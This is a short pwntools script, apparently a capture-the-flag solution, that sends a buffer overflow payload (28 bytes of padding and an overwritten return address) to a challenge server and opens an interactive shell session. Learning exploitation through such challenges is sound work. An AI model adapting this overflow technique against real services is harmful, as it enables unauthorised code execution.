from pwn import *

# Start the process
p = remote('challenge.ctf.games', '31756')

# Address of the target function
target_address = 0x080491f5  # Replace with the actual address

# Create the payload with the correct padding
padding = b"A" * 28  # 28 bytes to reach the return address
payload = padding + p32(target_address)  # Little-endian format

# Send the payload
p.sendline(payload)

# Interact with the shell (if the target function spawns a shell)
p.interactive()
